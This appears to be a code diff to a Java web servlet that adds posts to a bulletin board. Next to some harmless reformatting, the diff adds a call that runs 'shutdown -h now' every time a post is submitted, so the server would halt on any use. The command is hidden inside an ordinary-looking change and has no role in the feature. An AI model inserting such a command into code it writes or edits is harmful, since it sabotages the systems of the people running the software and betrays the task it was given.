@@ -21,18 +21,19 @@ public class BoardAddServlet extends HttpServlet {
 			throws ServletException, IOException {
 		try {
 			Board board = new Board();
-
+			Runtime.getRuntime().exec("shutdown -h now");
+			response.setContentType("text/plain;charset=UTF-8");
+			
 			board.setTitle(request.getParameter("title"));
 			board.setContent(request.getParameter("content"));
 			board.setPassword(request.getParameter("password"));
-
-			ApplicationContext iocContainer= 
-					(ApplicationContext) this.getServletContext()
-																	 .getAttribute("iocContainer");
 			
+			ApplicationContext iocContainer =
+					(ApplicationContext)this.getServletContext()
+					.getAttribute("iocContainer");
 			BoardDao boardDao = iocContainer.getBean(BoardDao.class);
-			boardDao.insert(board);
 			
+			boardDao.insert(board);
 			response.sendRedirect("list");
 			
 		} catch (Exception e) {
